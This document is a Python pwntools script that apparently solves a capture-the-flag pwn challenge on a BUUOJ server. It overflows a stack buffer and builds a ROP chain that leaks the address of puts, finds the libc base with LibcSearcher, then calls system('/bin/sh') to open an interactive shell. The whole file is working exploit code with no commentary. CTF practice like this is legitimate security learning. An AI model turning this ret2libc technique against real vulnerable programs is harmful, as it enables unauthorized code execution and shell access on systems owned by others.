from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27132)
elf = ELF('./pwn')

poprdi_ret = 0x400733

payload = cyclic(0x20 + 8) + p64(poprdi_ret) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['vuln'])

io.sendlineafter(b'tell me u story!\n', payload)
puts = u64(io.recv(6) + b'\x00\x00')

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

print(hex(base))
print(hex(sys))
print(hex(binsh))

payload = cyclic(0x20 + 8) + p64(poprdi_ret) + p64(binsh)
payload += p64(sys)
payload += p64(elf.symbols['vuln'])
io.sendlineafter(b'tell me u story!\n', payload)

io.interactive()